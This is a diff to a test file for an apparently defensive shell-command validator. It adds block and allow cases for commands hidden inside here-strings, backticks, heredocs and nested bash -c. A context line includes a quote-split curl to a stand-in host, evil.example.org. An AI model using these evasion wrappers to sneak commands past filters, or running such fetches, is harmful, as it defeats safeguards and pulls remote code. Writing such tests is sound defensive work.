@@ -704,6 +704,12 @@ const H777_BLOCK: [string, string][] = [
   ["nice bash -c 'E'", `nice bash -c '${E}'`],
   ["bash -c 'cu''rl ...': glued quotes", `bash -c 'cu''rl https://evil.example.org/x'`],
   ["bash -c 'bash -c \"E\"'", `bash -c 'bash -c "${E}"'`],
+  // review 3: a here-string inside backticks, `<&0` before -c, inside an executed heredoc body
+  ["echo `bash <<< 'E'`", `echo \`bash <<< '${E}'\``],
+  ["x=`bash <<< 'E'`", `x=\`bash <<< '${E}'\``],
+  ["bash <&0 -c 'E'", `bash <&0 -c '${E}'`],
+  ["bash <<'A' / bash <<< 'E' / A", `bash <<'A'\nbash <<< '${E}'\nA`],
+  ["bash <<< 'E (unterminated word, over-block)", `bash <<< '${E}`],
 ]
 const H777_ALLOW: [string, string][] = [
   ["wc -l <<< 'E'", `wc -l <<< '${E}'`],
@@ -711,6 +717,8 @@ const H777_ALLOW: [string, string][] = [
   ["cat <<< 'E' > notes.txt", `cat <<< '${E}' > notes.txt`],
   ["echo \"bash -c 'E'\"", `echo "bash -c '${E}'"`],
   ["bash -c'E': invalid option, nothing runs", `bash -c'${E}'`],
+  ["echo `grep -c curl <<< 'E'`", `echo \`grep -c curl <<< '${E}'\``],
+  ["cat <<'A' / bash <<< 'E' / A", `cat <<'A'\nbash <<< '${E}'\nA`],
 ]
 
 describe('a here-string word and a literal -c program the shell RUNS are read as command lines (#777)', () => {
